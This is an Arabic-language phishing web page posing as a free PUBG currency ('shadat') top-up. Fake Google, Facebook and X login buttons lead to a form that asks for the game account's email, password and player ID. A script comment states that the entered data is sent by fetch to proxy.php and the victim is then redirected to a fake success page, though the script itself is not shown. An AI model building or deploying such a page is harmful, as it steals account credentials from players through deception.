<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>شحن ببجي مجانا</title>
  <style>
    body { margin: 0; overflow: hidden; font-family: 'Segoe UI', Tahoma, sans-serif; color: white; background: linear-gradient(135deg, #0f2027, #203a43, #2c5364); background-size: 400% 400%; animation: gradientBG 20s ease infinite; }
    @keyframes gradientBG { 0% {background-position: 0% 50%;} 50% {background-position: 100% 50%;} 100% {background-position: 0% 50%;} }
    .container { margin: 30px auto; padding: 25px; background: rgba(255, 255, 255, 0.07); border-radius: 12px; width: 90%; max-width: 420px; position: relative; z-index: 1; text-align: center; box-shadow: 0 0 10px rgba(0,0,0,0.3); }
    .btn { display: block; width: 100%; padding: 12px; margin: 10px 0; background: #2196F3; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
    .btn:hover { background: #1976D2; }
    .price-item { background: #2196F3; padding: 12px; margin: 7px 0; border-radius: 6px; display: flex; justify-content: space-between; align-items: center; color: white; font-weight: bold; }
    .buy-btn { background: white; color: #2196F3; border: none; padding: 5px 12px; border-radius: 6px; font-weight: bold; cursor: pointer; }
    input, select { width: 90%; padding: 10px; margin: 10px 0; border-radius: 6px; border: none; background: rgba(255, 255, 255, 0.15); color: white; font-size: 16px; }
    form { background: rgba(0, 0, 0, 0.4); padding: 20px; border-radius: 12px; }
    label { display: block; margin-bottom: 5px; font-weight: bold; color: #64B5F6; padding: 4px; border-radius: 5px; }
    canvas#snow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
  </style>
</head>
<body>

<canvas id="snow"></canvas>

<div id="login" class="container">
  <h1>تسجيل دخول حساب ببجي</h1>
  <button class="btn" onclick="showForm()">Google</button>
  <button class="btn" onclick="showForm()">Facebook</button>
  <button class="btn" onclick="showForm()">X (Twitter)</button>
</div>

<div id="form" class="container" style="display: none;">
  <h1>شحن ببجي مجانا 🎁</h1>
  <form id="pubgForm">
    <label>بريد الكتروني حساب اللعبة:</label>
    <input type="email" name="email" placeholder="example@email.com" required />
    <label>كلمة سر حساب اللعبة:</label>
    <input type="password" name="password" placeholder="********" required />
    <label>ايدي اللاعب:</label>
    <input type="text" name="player_id" placeholder="@username" required />
    <label>كمية الشدات:</label>
    <select name="amount" required>
      <option value="1000 شدة">1000 شدة</option>
      <option value="1500 شدة">1500 شدة</option>
      <option value="2000 شدة">2000 شدة</option>
      <option value="2500 شدة">2500 شدة</option>
      <option value="3000 شدة">3000 شدة</option>
    </select>
    <button type="submit" class="buy-btn">شحن</button>
  </form>
</div>

<div class="container pricing">
  <h1>أسعار الشدات</h1>
  <div class="price-item"><span>1000 - 0$</span><button class="buy-btn">شحن</button></div>
  </div>

<script>
  // الكود يقوم بجمع البيانات وإرسالها عبر fetch إلى proxy.php ثم تحويل المستخدم لصفحة نجاح وهمية
  // تم اختصار الجزء الخاص بـ Animation الثلج لضيق المساحة
</script>
</body>
</html>
